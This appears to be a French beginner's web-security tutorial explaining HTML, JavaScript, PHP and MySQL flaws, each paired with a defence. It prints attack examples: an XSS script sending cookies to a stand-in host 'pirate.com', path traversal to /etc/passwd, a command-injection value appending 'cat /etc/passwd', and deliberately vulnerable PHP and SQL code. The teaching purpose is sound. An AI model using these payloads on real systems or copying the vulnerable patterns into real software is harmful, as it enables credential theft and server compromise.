Failles HTML

Le HTML, c'est le squelette de chaque page web. C'est ce que votre navigateur lit pour afficher du texte, des images, des boutons… Mais attention : tout le monde peut voir le code HTML d'un site. Ça peut créer des problèmes de sécurité.

Danger élevé

🖱️ Clickjacking — Le piège du faux clic

🎯

C'est quoi ?

Imaginez qu'un pirate place une page invisible par-dessus un bouton. Vous pensez cliquer sur « Gagner un cadeau », mais en réalité vous cliquez sur « Transférer de l'argent » sur le site de votre banque. C'est comme si quelqu'un mettait une vitre transparente devant un distributeur de billets.

🧪 Démo interactive Cliquez sur le bouton vert…

⚠️ Site bancaire

🎁 Super concours !

HTML — Ce que le pirate écrit ⚠ Dangereux 
<!-- Le pirate cache la page de la banque par-dessus -->
<iframe src="https://banque.com/virement"
        style="opacity: 0; position: absolute;"></iframe>

<!-- Vous voyez juste ce bouton innocent -->
<button>Cliquez ici pour gagner !</button>
🛡️ Comment se protéger ?

Le développeur du site de la banque ajoute un bouclier invisible : l'en-tête X-Frame-Options: DENY. Ça dit au navigateur : « Interdiction d'afficher mon site dans un cadre invisible ! »

Danger moyen

👀 Code source visible — Les secrets mal cachés

🔍

C'est quoi ?

Sur n'importe quel site, vous pouvez faire clic droit → « Afficher le code source » et voir tout le HTML. Si le développeur a laissé des informations secrètes dans le code (comme un mot de passe ou des notes privées), tout le monde peut les lire. C'est comme écrire son code de carte bleue sur un post-it collé à l'extérieur de son portefeuille.

🧪 Démo interactive Cliquez sur « Inspecter le code » pour voir les secrets
www.monsupersite.fr

Ce site est génial et tout est bien sécurisé…

<h1>Bienvenue !</h1>

<!-- TODO: supprimer avant la mise en ligne
     Mot de passe admin : admin123
     Serveur : 192.168.1.42 -->

<input type="hidden"
       name="role"
       value="admin">
🚨 On voit le mot de passe et des infos secrètes !
HTML — Ce qu'il ne faut jamais écrire ⚠ Dangereux 
<!-- Mot de passe base de données : admin123 -->
<input type="hidden" name="id_admin" value="42">
🛡️ Comment se protéger ?

Jamais de secrets dans le HTML. Avant de publier un site, on enlève tous les commentaires et toutes les informations sensibles. Les mots de passe et les données privées doivent rester uniquement sur le serveur, jamais dans le code visible.

02
⚡ JavaScript

Failles JavaScript

JavaScript est le langage qui rend les sites web interactifs : les menus déroulants, les animations, les formulaires… Il s'exécute directement dans votre navigateur — et c'est là le problème : un pirate peut en profiter.

Très dangereux

💉 XSS — L'injection de code pirate

🎭

C'est quoi ?

Imaginez un livre d'or sur un site web. Normalement, les visiteurs écrivent des messages gentils. Mais un pirate, au lieu d'écrire un message, écrit du code informatique. Quand un autre visiteur lit le livre d'or, le code du pirate s'exécute dans son navigateur et peut voler ses identifiants de connexion. C'est comme si quelqu'un glissait un mouchard dans une lettre.

🧪 Démo interactive Tapez un commentaire… ou essayez de taper : <b>texte</b>
Texte normal Code HTML ⚠️ Attaque XSS

📋 Commentaires affichés :

Marie : Super site, bravo ! 👍
⚠️ Du code HTML a été injecté ! Sur un vrai site sans protection, ce code pourrait voler vos données.
JavaScript — Ce que le pirate écrit dans le commentaire ⚠ Dangereux 
// Le pirate tape ceci dans un champ commentaire :
<script>
  // Ce code vole les cookies (identifiants) du visiteur
  document.location = "https://pirate.com/?cookie="
    + document.cookie
</script>
🛡️ Comment se protéger ?

Ne jamais afficher directement ce qu'un utilisateur a tapé. En JavaScript, on utilise textContent (qui affiche du texte brut) au lieu de innerHTML (qui exécute le code). Côté serveur, on « nettoie » les caractères spéciaux pour les rendre inoffensifs.

Danger élevé

🔓 Validation côté client — Le vigile en carton

🚪

C'est quoi ?

Certains sites vérifient les informations (comme l'âge ou l'email) uniquement avec JavaScript, dans votre navigateur. Le problème ? N'importe qui peut désactiver JavaScript dans son navigateur ! C'est comme mettre un vigile en carton à l'entrée d'une boîte de nuit : ça fait illusion, mais ça n'arrête personne.

🧪 Démo interactive Essayez de vous inscrire avec un âge < 18, puis désactivez le vigile

📝 Inscription - Site réservé aux +18 ans

🛡️ Vérification JavaScript

Le vigile JavaScript est actif. Il bloque les mineurs.

JavaScript — Vérification contournable ⚠ Dangereux 
// Cette vérification peut être contournée
// en désactivant JavaScript dans le navigateur
if (age < 18) {
  alert('Accès interdit !');
  return false;
}
🛡️ Comment se protéger ?

Toujours revérifier sur le serveur (en PHP par exemple). La vérification JavaScript, c'est juste pour le confort : elle montre un message d'erreur instantanément. Mais le vrai contrôle de sécurité doit se faire côté serveur, là où le pirate ne peut pas tricher.

03
🐘 PHP

Failles PHP

PHP est un langage qui tourne sur le serveur (l'ordinateur qui héberge le site). Contrairement à HTML et JavaScript, le visiteur ne voit pas le code PHP. Mais si un pirate trouve une faille PHP, il peut prendre le contrôle total du serveur.

Très dangereux

📂 Inclusion de fichiers — Lire les fichiers secrets

📁

C'est quoi ?

Beaucoup de sites utilisent l'URL pour décider quelle page afficher. Par exemple : site.com/?page=contact affiche la page contact. Mais si le développeur ne vérifie pas ce qu'on met dans l'URL, un pirate peut écrire ?page=../../../etc/passwd pour remonter dans les dossiers du serveur et lire des fichiers secrets (comme la liste des mots de passe). C'est comme si un visiteur de musée pouvait ouvrir les portes « Personnel uniquement ».

🧪 Démo interactive Cliquez sur les pages, puis essayez l'attaque
🏠 Accueil 📧 Contact 💀 Attaque !
site.com/?page=accueil

🏠 Bienvenue sur notre site !

Nous sommes ravis de vous accueillir.

PHP — Code vulnérable ⚠ Dangereux 
// Le développeur prend le nom de page depuis l'URL
$page = $_GET['page'];
include($page . '.php');

// Le pirate tape dans l'URL :
// ?page=../../../etc/passwd
// → Il remonte les dossiers et lit les mots de passe !
🛡️ Comment se protéger ?

On crée une liste de pages autorisées (par exemple : accueil, contact, à propos). Si le visiteur demande une page qui n'est pas dans la liste, on refuse. C'est comme un videur avec une liste d'invités : si ton nom n'est pas dessus, tu ne rentres pas.

Très dangereux

⌨️ Exécution de commandes — Prendre le contrôle du serveur

💻

C'est quoi ?

Certains sites proposent des outils en ligne, comme un test de connexion (« ping »). Le site envoie une commande au serveur. Mais si le développeur utilise directement ce que l'utilisateur tape, le pirate peut ajouter ses propres commandes après. C'est comme si vous demandiez à quelqu'un « Appelle le numéro que je te donne » et que le pirate vous donnait : « 0612345678 ; et vide aussi mon coffre-fort ».

🧪 Démo interactive Testez avec une IP normale, puis essayez l'attaque

🌐 Outil de test réseau

IP normale ⚠️ Avec attaque

PHP — Commande injectable ⚠ Dangereux 
// Le développeur utilise directement l'entrée utilisateur
$ip = $_GET['ip'];
system('ping -c 1 ' . $ip);

// Le pirate écrit dans l'URL :
// ?ip=8.8.8.8 ; cat /etc/passwd
// → Le serveur exécute DEUX commandes !
🛡️ Comment se protéger ?

On utilise escapeshellarg() en PHP : cette fonction entoure la valeur de guillemets et neutralise les caractères dangereux (comme le ;). Mieux encore : éviter complètement ces fonctions si on peut faire autrement.

04
🗄️ MySQL

Failles MySQL

MySQL est une base de données : c'est l'endroit où le site stocke toutes ses informations (comptes utilisateurs, messages, commandes…). Si un pirate accède à la base de données, il a accès à tout.

Très dangereux

💉 Injection SQL — Se connecter sans mot de passe

🗝️

C'est quoi ?

C'est la faille la plus célèbre au monde. Quand vous vous connectez sur un site, le serveur vérifie votre identifiant et mot de passe dans la base de données en posant une question (une « requête SQL »). Si cette requête est mal construite, le pirate peut modifier la question elle-même pour la tromper. C'est comme si à un examen, au lieu de répondre à la question, vous modifiiez l'énoncé pour que toutes les réponses soient correctes.

🧪 Démo interactive Essayez de vous connecter, puis testez l'attaque !

🔐 Connexion au site

Connexion normale ⚠️ Injection SQL

🔎 Requête envoyée à la base :

SELECT * FROM users
WHERE login='admin'
AND pwd='test123'
PHP — Code vulnérable vs. code sécurisé ⚠ Dangereux 
// ❌ DANGEREUX — le pirate peut modifier la requête
$sql = "SELECT * FROM users WHERE login='"
  . $login . "' AND pwd='" . $pwd . "'";
PHP — Code corrigé avec requête préparée ✓ Sécurisé 
// ✅ SÉCURISÉ — les valeurs sont séparées de la requête
$stmt = $pdo->prepare(
  'SELECT * FROM users WHERE login=? AND pwd=?'
);
$stmt->execute([$login, $pwd]);
🛡️ Comment se protéger ?

On utilise des requêtes préparées (avec PDO en PHP). Au lieu de coller la réponse de l'utilisateur directement dans la question, on met des ? à la place, et on envoie les valeurs séparément. Le serveur sait alors que ce sont des données, pas des instructions. Impossible de tricher.

Danger élevé

🔑 Mots de passe en clair — Le coffre-fort ouvert

📖

C'est quoi ?

Si un site stocke les mots de passe tels quels dans sa base de données (comme on écrirait « motdepasse123 » dans un carnet), n'importe qui ayant accès à cette base peut les lire. C'est comme ranger la clé de chez vous sous le paillasson : si quelqu'un regarde dessous, c'est fini.

SQL — Ce que voit un pirate dans la base ⚠ Dangereux 
-- ❌ Mots de passe lisibles directement :
login: admin   | password: monMotDePasse123
login: marie   | password: azerty2024
🛡️ Comment se protéger ?

On utilise le hachage : la fonction password_hash() en PHP transforme « motdepasse123 » en une suite de caractères incompréhensible (comme $2y$10$xK3v...). C'est une opération à sens unique : on ne peut pas retrouver le mot de passe original. Pour vérifier, on utilise password_verify(). Même le développeur ne peut pas lire les mots de passe.
